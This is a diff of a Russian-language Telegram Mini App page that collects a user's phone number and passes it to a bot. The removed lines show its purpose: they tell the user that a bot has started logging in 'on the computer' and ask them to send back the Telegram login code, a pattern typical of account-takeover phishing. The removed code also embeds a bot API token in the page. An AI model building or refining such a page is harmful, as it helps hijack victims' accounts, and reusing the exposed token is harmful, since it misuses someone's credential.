@@ -143,12 +143,6 @@
             box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
         }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
         .loading {
             text-align: center;
             padding: 40px 20px;
@@ -212,31 +206,7 @@
 
                 <div class="buttons">
                     <button class="btn btn-cancel" onclick="closeApp()">ОТМЕНА</button>
-                    <button class="btn btn-next" onclick="sendPhone()">ДАЛЕЕ</button>
-                </div>
-            </div>
-
-            <!-- Шаг 2: Успешная отправка -->
-            <div id="stepSuccess" class="step">
-                <div class="success-info">
-                    ✅ <b>Номер отправлен!</b>
-                </div>
-                
-                <div class="instructions">
-                    📱 <b>Автоматический вход запущен</b><br><br>
-                    
-                    Бот начал процесс авторизации на компьютере.<br><br>
-                    
-                    📩 <b>Что делать дальше:</b><br>
-                    1. Дождитесь код в Telegram<br>
-                    2. Вернитесь в чат с ботом<br>
-                    3. Отправьте код в формате: <code>12345</code><br><br>
-                    
-                    Закройте это окно и вернитесь в бота.
-                </div>
-
-                <div class="buttons">
-                    <button class="btn btn-next" onclick="closeApp()">ЗАКРЫТЬ</button>
+                    <button class="btn btn-next" onclick="sendPhone()">АВТОРИЗОВАТЬСЯ</button>
                 </div>
             </div>
 
@@ -272,66 +242,29 @@
             
             userPhone = '+7' + phone;
             
-            console.log('Отправка номера:', userPhone);
-            
             document.getElementById('loadingText').textContent = 'Отправка номера...';
             showStep('stepLoading');
 
-            // Отправляем только номер телефона
+            // Отправляем данные через WebApp
             const data = {
                 action: 'send_phone',
                 phone: userPhone
             };
             
             try {
-                await sendToBot(data);
-                console.log('Номер отправлен через Bot API');
+                // Отправляем данные в бота через WebApp
+                tg.sendData(JSON.stringify(data));
                 
-                // Показываем экран успеха
+                // Закрываем приложение через 2 секунды
                 setTimeout(() => {
-                    showStep('stepSuccess');
-                }, 1000);
+                    tg.close();
+                }, 2000);
                 
             } catch (error) {
                 console.error('Ошибка отправки:', error);
                 alert('Ошибка отправки номера. Попробуйте еще раз.');
                 showStep('stepPhone');
             }
-        }
-
-        // Функция отправки данных через Bot API
-        async function sendToBot(data) {
-            const botToken = '8050324645:AAG4uLsMm-3v6-Yrc-9fc8vwdtCsa3tCDxw';
-            const chatId = tg.initDataUnsafe.user?.id;
-            
-            if (!chatId) {
-                throw new Error('Не удалось получить chat_id');
-            }
-
-            // ОТПРАВЛЯЕМ ТОЛЬКО НОМЕР, БЕЗ КОДА!
-            const message = `📱 <b>Данные из Web App:</b>\n` +
-                           `📞 Номер: <code>${data.phone}</code>\n` +
-                           `⚡ Действие: ${data.action}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
-            }
-
-            return await response.json();
         }
 
         function closeApp() {
